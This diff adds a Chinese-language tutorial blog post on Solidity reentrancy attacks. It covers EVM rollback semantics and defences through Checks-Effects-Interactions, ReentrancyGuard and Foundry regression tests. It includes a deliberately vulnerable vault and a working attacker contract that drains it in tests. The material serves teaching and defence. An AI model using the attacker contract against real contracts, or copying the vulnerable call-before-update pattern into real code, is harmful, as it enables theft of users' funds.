@@ -1,0 +1,421 @@
+export const metadata = {
+  title: "Solidity 重入攻击详解：攻击过程、错误回滚与防御方案",
+  description:
+    "从调用栈和 EVM 回滚语义出发，完整复现 Solidity 重入攻击，并使用 Checks-Effects-Interactions、ReentrancyGuard 和 Foundry 测试验证修复。",
+  date: "2026-08-20",
+  slug: "solidity-reentrancy-attack",
+  lang: "zh",
+  tags: ["solidity", "ethereum", "security", "reentrancy", "foundry", "web3"],
+  draft: false,
+}
+
+重入攻击（Reentrancy Attack）发生在合约把控制权交给外部地址后，外部地址又在原函数完成状态更新之前回调目标合约。目标函数会在旧状态上再次执行，攻击者因此能够重复提款、绕过额度限制，或者破坏协议的不变量。
+
+重入并不等同于“使用了 `call`”。真正危险的组合通常是：**外部调用发生在关键状态更新之前，并且被重入的入口仍然能够通过检查**。
+
+> 本文代码只用于本地安全研究与测试。请勿对没有明确授权的合约、网络或资产执行攻击。
+
+---
+
+## 一、先理解一次正常提款
+
+一个资金库通常会执行三个阶段：
+
+1. **Checks（检查）**：确认调用者拥有可提款余额
+2. **Effects（状态更新）**：扣除或清零调用者余额
+3. **Interactions（外部交互）**：向调用者发送 ETH
+
+如果严格按照这个顺序执行，那么接收方拿到控制权时，资金库中的余额已经更新。接收方即使回调 `withdraw`，也无法再次通过余额检查。
+
+漏洞代码却把第二、三步颠倒了：
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract VulnerableVault {
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Nothing to withdraw");
+
+        // 错误：先把控制权交给外部地址。
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "ETH transfer failed");
+
+        // 此时才更新状态，已经太晚。
+        balances[msg.sender] = 0;
+    }
+}
+```
+
+`msg.sender.call{value: amount}("")` 会执行接收方的 `receive` 或 `fallback`。如果接收方是另一个合约，它可以在这次调用返回前执行任意逻辑，包括再次调用 `withdraw`。
+
+---
+
+## 二、攻击合约如何重入
+
+下面的攻击合约先存入 1 ETH，让自己获得合法余额，然后在收到 ETH 时重复调用提款函数：
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+interface IVulnerableVault {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract ReentrancyAttacker {
+    IVulnerableVault public immutable vault;
+    address public immutable owner;
+
+    constructor(address vaultAddress) {
+        vault = IVulnerableVault(vaultAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        require(msg.sender == owner, "Not owner");
+        require(msg.value == 1 ether, "Send exactly 1 ether");
+
+        vault.deposit{value: 1 ether}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        // 每收到 1 ETH，就在前一次 withdraw 尚未结束时再次提款。
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw();
+        }
+    }
+
+    function sweep() external {
+        require(msg.sender == owner, "Not owner");
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "Sweep failed");
+    }
+}
+```
+
+假设资金库原来有其他用户存入的 10 ETH，攻击过程如下：
+
+```text
+初始：Vault 余额 = 10 ETH，Attacker 记账余额 = 0
+  ↓ Attacker.deposit(1 ETH)
+Vault 余额 = 11 ETH，balances[Attacker] = 1 ETH
+  ↓ Attacker.attack() 调用 Vault.withdraw()        [第 1 层]
+读取 balances[Attacker] = 1 ETH
+  ↓ Vault 向 Attacker 发送 1 ETH
+Attacker.receive() 获得控制权
+  ↓ receive() 再次调用 Vault.withdraw()            [第 2 层]
+仍然读取 balances[Attacker] = 1 ETH
+  ↓ 再发送 1 ETH，并进入第 3 层
+  ↓ 重复，直到 Vault 剩余余额小于 1 ETH
+调用栈逐层返回，每一层最后都执行 balances[Attacker] = 0
+最终：Vault 余额 = 0，Attacker 合约余额 = 11 ETH
+```
+
+关键点是第 2 层进入时，第 1 层尚未执行 `balances[msg.sender] = 0`。所有重入层都读取到相同的 1 ETH 旧余额。调用栈展开时重复写入 `0`，并不能追回已经发送的 ETH。
+
+### EVM 调用栈视角
+
+```text
+ReentrancyAttacker.attack
+└─ VulnerableVault.withdraw                  # 读取余额 1 ETH
+   └─ ReentrancyAttacker.receive             # 收到第 1 笔 ETH
+      └─ VulnerableVault.withdraw            # 仍读取 1 ETH
+         └─ ReentrancyAttacker.receive       # 收到第 2 笔 ETH
+            └─ VulnerableVault.withdraw      # 继续重入
+               └─ ...
+```
+
+这不是多线程并发。EVM 仍然按调用栈同步执行，只是外层函数在等待外部调用返回时，目标合约被再次进入。
+
+---
+
+## 三、为什么有时攻击会整体回滚
+
+重入是否成功不仅取决于漏洞，还取决于最深层调用如何结束，以及各层是否处理失败。
+
+### 情况 1：底层 `call` 返回 `false`，调用者继续执行
+
+低级调用不会因为被调用方回滚而自动回滚调用者，它只会返回：
+
+```solidity
+(bool success, bytes memory returnData) = target.call(data);
+```
+
+如果 `success == false`，被调用方这一层产生的状态修改和 ETH 转移会回滚，但调用者可以选择继续执行。忽略返回值往往会制造新的记账错误。
+
+### 情况 2：调用者检查失败并执行 `revert`
+
+漏洞示例使用了：
+
+```solidity
+require(success, "ETH transfer failed");
+```
+
+如果最深层外部调用失败，该层 `require` 会回滚；错误继续向外传播，可能让每一层都失败，最后使**整笔顶层交易**回滚。整笔交易中的余额写入、事件和 ETH 转移都会恢复到交易开始前的状态，只有已经消耗的 Gas 不会返还。
+
+### 常见的具体失败原因
+
+- 资金库余额不足，带 value 的 `call` 返回 `false`
+- 攻击者的 `receive` 主动 `revert`
+- 防重入锁拒绝嵌套调用
+- 内层触发 `require`、自定义错误、算术溢出或 panic
+- 调用深度或 Gas 条件使内层调用失败
+
+示例攻击合约用 `address(vault).balance >= 1 ether` 主动停止重入，是为了让最深层正常返回。如果不做这个判断，最后一次发送会因余额不足失败，`require(success)` 可能让整条攻击链回滚，攻击者将一无所获并损失 Gas。
+
+> “内层调用失败”与“整笔交易回滚”不是同一件事。只有失败被冒泡，或者上层根据 `success == false` 再次 `revert`，回滚才会继续扩展到上层调用帧。
+
+| 场景 | 内层结果 | 顶层可见结果 | 回滚范围 |
+| --- | --- | --- | --- |
+| 攻击者在资金不足前主动停止 | 最深层正常返回 | 交易成功 | 不回滚，重复转账生效 |
+| 发送余额不足，且外层检查 `success` | `call` 返回 `false` | `Error("ETH transfer failed")` | 整笔攻击交易回滚 |
+| CEI 阻止再次提款 | 内层 `NothingToWithdraw()` | 示例最终为 `EtherTransferFailed()` | 整笔提款交易回滚 |
+| `ReentrancyGuard` 拒绝重入 | 内层 `ReentrancyGuardReentrantCall()` | 示例最终为 `EtherTransferFailed()` | 整笔提款交易回滚 |
+| 外层忽略失败的低级调用 | `call` 返回 `false` | 外层仍可能成功 | 只回滚失败的被调用帧 |
+
+---
+
+## 四、首选修复：Checks-Effects-Interactions
+
+最直接的修复是在发送 ETH 前清零余额：
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract SafeVaultCEI {
+    error NothingToWithdraw();
+    error EtherTransferFailed();
+
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        // Checks
+        uint256 amount = balances[msg.sender];
+        if (amount == 0) revert NothingToWithdraw();
+
+        // Effects
+        balances[msg.sender] = 0;
+
+        // Interactions
+        (bool success, ) = msg.sender.call{value: amount}("");
+        if (!success) revert EtherTransferFailed();
+    }
+}
+```
+
+现在攻击者第一次收到 ETH 后再次调用 `withdraw`，内层会看到余额已经是 `0`，并触发：
+
+```solidity
+revert NothingToWithdraw();
+```
+
+如果攻击者的 `receive` 没有捕获这个错误，那么接收函数也会回滚，外层 `call` 得到 `false`，随后资金库触发：
+
+```solidity
+revert EtherTransferFailed();
+```
+
+最终整笔提款交易回滚：
+
+- `balances[attacker] = 0` 被撤销，记账余额恢复为 1 ETH
+- 最初发送给攻击合约的 1 ETH 被撤销，资金回到资金库
+- 交易中产生的事件被移除
+- 攻击者只损失本次交易消耗的 Gas
+
+如果攻击者在 `receive` 中用 `try/catch` 或低级调用捕获内层错误，并让 `receive` 正常返回，外层提款可以成功，但攻击者也只能取回自己的 1 ETH，无法重复提款。
+
+---
+
+## 五、纵深防御：ReentrancyGuard
+
+Checks-Effects-Interactions 应当作为基本设计原则。对于涉及多个外部调用、复杂继承或多个共享状态入口的合约，还可以增加 OpenZeppelin `ReentrancyGuard`：
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import {ReentrancyGuard} from
+    "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract SafeVault is ReentrancyGuard {
+    error NothingToWithdraw();
+    error EtherTransferFailed();
+
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external nonReentrant {
+        uint256 amount = balances[msg.sender];
+        if (amount == 0) revert NothingToWithdraw();
+
+        balances[msg.sender] = 0;
+
+        (bool success, ) = msg.sender.call{value: amount}("");
+        if (!success) revert EtherTransferFailed();
+    }
+}
+```
+
+`nonReentrant` 在进入函数时加锁，正常返回时解锁。同一保护域中的嵌套调用会触发 OpenZeppelin 5.x 的：
+
+```solidity
+error ReentrancyGuardReentrantCall();
+```
+
+如果该错误穿过攻击者的 `receive` 返回到低级 `call`，资金库看到的仍然只是 `success == false`。由于示例随后抛出 `EtherTransferFailed()`，顶层最终可见错误是 `EtherTransferFailed()`；内层的 `ReentrancyGuardReentrantCall()` revert data 已被这段代码替换。
+
+不要只加修饰器就停止检查状态顺序。CEI 能减少暴露面，锁则提供第二道边界，两者用途不同。
+
+### `nonReentrant` 的常见限制
+
+两个带 `nonReentrant` 的函数不能互相调用。可以把共享逻辑放到 `private` 函数，由不同的 `external nonReentrant` 入口调用：
+
+```solidity
+function withdraw() external nonReentrant {
+    _withdrawTo(payable(msg.sender));
+}
+
+function withdrawTo(address payable recipient) external nonReentrant {
+    _withdrawTo(recipient);
+}
+
+function _withdrawTo(address payable recipient) private {
+    // 检查、状态更新、外部调用
+}
+```
+
+---
+
+## 六、其他防御方案
+
+### 1. Pull Payment
+
+把“业务结算”和“用户领取”拆开。协议只记录可领取额度，用户通过独立入口主动领取。领取函数仍需遵循 CEI，并建议使用防重入锁。
+
+### 2. 同时保护跨函数重入
+
+攻击者未必再次调用同一个函数。假设 `withdraw` 在外部调用前暂时破坏了总资产不变量，攻击者可以从 `receive` 调用 `borrow`、`transfer` 或 `claimReward` 利用中间状态。审计时应按“共享哪些状态”划分保护域，而不是只搜索递归函数名。
+
+### 3. 防范只读重入
+
+某个函数即使是 `view`，也可能在另一个函数状态尚未稳定时读到临时值。依赖该值的外部协议、预言机或定价逻辑可能被误导。锁、快照和始终保持状态不变量都可能是必要措施。
+
+### 4. 不要依赖 `transfer` 或 `send` 的 2300 Gas
+
+把 `transfer` 当成防重入机制并不稳健。Gas 成本可能随 EVM 升级变化，而且固定 Gas 补贴会破坏智能合约钱包的兼容性。现代代码通常使用 `call`，同时明确检查返回值，并通过 CEI、锁和测试保证安全。
+
+### 5. 限制外部交互并检查所有返回值
+
+外部交互不仅包括发送 ETH，还包括 ERC-20 回调、ERC-777 hooks、ERC-721/1155 safe transfer、闪电贷回调和任意插件调用。任何把控制权交给不受信任代码的地方都应视为潜在重入点。
+
+---
+
+## 七、使用 Foundry 验证攻击与回滚
+
+回归测试应同时验证“资金没有被盗”和“失败后状态恢复”，而不只是使用 `expectRevert`。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {VulnerableVault} from "../src/VulnerableVault.sol";
+import {SafeVaultCEI} from "../src/SafeVaultCEI.sol";
+import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";
+
+contract ReentrancyTest is Test {
+    VulnerableVault internal vulnerable;
+    SafeVaultCEI internal safe;
+    ReentrancyAttacker internal attacker;
+    ReentrancyAttacker internal safeAttacker;
+
+    address internal alice = makeAddr("alice");
+
+    function setUp() public {
+        vulnerable = new VulnerableVault();
+        safe = new SafeVaultCEI();
+
+        vm.deal(alice, 20 ether);
+        vm.prank(alice);
+        vulnerable.deposit{value: 10 ether}();
+
+        vm.prank(alice);
+        safe.deposit{value: 10 ether}();
+
+        attacker = new ReentrancyAttacker(address(vulnerable));
+        safeAttacker = new ReentrancyAttacker(address(safe));
+    }
+
+    function test_ReentrancyDrainsVulnerableVault() public {
+        attacker.attack{value: 1 ether}();
+
+        assertEq(address(vulnerable).balance, 0);
+        assertEq(address(attacker).balance, 11 ether);
+        assertEq(vulnerable.balances(address(attacker)), 0);
+    }
+
+    function test_SafeVaultRevertsAndRestoresAllState() public {
+        uint256 vaultBalanceBefore = address(safe).balance;
+        uint256 attackerBalanceBefore = address(safeAttacker).balance;
+
+        vm.expectRevert(SafeVaultCEI.EtherTransferFailed.selector);
+        safeAttacker.attack{value: 1 ether}();
+
+        // attack() 中的 deposit 也属于同一顶层交易，因此一起回滚。
+        assertEq(address(safe).balance, vaultBalanceBefore);
+        assertEq(address(safeAttacker).balance, attackerBalanceBefore);
+        assertEq(safe.balances(address(safeAttacker)), 0);
+    }
+}
+```
+
+第二个测试中，`attack{value: 1 ether}()` 内部先 `deposit` 再 `withdraw`，两者都位于同一笔顶层交易。后续 `withdraw` 回滚时，前面的存款也会被撤销，所以安全资金库仍是 10 ETH，攻击合约记账余额仍是 0。
+
+实际项目还应增加：
+
+- 正常 EOA 能成功提款的测试
+- 恶意接收方捕获内层错误后只能提取一次的测试
+- 两个入口共享余额时的跨函数重入测试
+- Fuzz 测试：资金库资产始终覆盖全部用户余额
+- Invariant 测试：任意调用序列后总资产与内部记账保持一致
+
+---
+
+## 八、安全审查清单
+
+审查每一个外部调用点时，逐项确认：
+
+1. 外部调用前，权限、余额、nonce 和限额是否都已检查？
+2. 外部调用前，关键状态是否已更新到最终值？
+3. 回调能否进入同一函数或另一个共享状态的函数？
+4. 低级调用失败后，代码是回滚、重试，还是错误地继续记账？
+5. 自定义错误和 revert data 是否按预期冒泡？
+6. 失败后 ETH、存储和事件是否全部恢复？
+7. 是否存在 ERC-777、NFT safe transfer、闪电贷等隐式回调？
+8. 升级合约中的锁状态和存储布局是否正确？
+
+---
+
+## 总结
+
+重入攻击的核心不是递归本身，而是外部代码在合约状态尚未稳定时重新取得执行权。漏洞版本先发送 ETH、后清零余额，使每一层重入都读到相同旧值；修复版本先更新状态，使下一层立即触发 `NothingToWithdraw()`，再由外层根据调用失败触发 `EtherTransferFailed()` 并回滚整笔交易。
+
+生产合约应组合使用 Checks-Effects-Interactions、`ReentrancyGuard`、最小化外部调用、严格的返回值处理，以及覆盖成功与失败路径的单元测试和 invariant 测试。安全的关键不是某一个修饰器，而是在任何可回调的时刻都不暴露可被利用的中间状态。
